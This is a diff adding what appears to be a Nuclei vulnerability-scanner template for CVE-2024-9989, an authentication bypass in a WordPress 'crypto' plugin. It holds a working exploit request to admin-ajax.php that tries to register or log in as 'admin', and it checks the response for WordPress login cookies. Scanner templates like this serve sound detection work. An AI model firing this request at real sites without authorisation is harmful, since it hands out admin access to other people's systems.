@@ -1,0 +1,53 @@
+id: wordpress-plugin-crypto-authentication-bypass
+info:
+  name: WordPress Plugin Crypto Authentication Bypass (CVE-2024-9989)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: authentication-bypass,cve-2024-9989
+
+http:
+  - id: detect-plugin
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/wp-content/plugins/crypto"
+        part: body
+    extractors:
+      - type: regex
+        name: plugin_detected
+        part: body
+        regex:
+          - "/wp-content/plugins/crypto"
+        internal: true
+
+  - id: attempt-bypass
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=crypto_connect_ajax_process&method_name=register&param1=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"error":false'
+          - "success"
+        part: body
+      - type: word
+        words:
+          - "wordpress_sec_"
+          - "wordpress_logged_in_"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
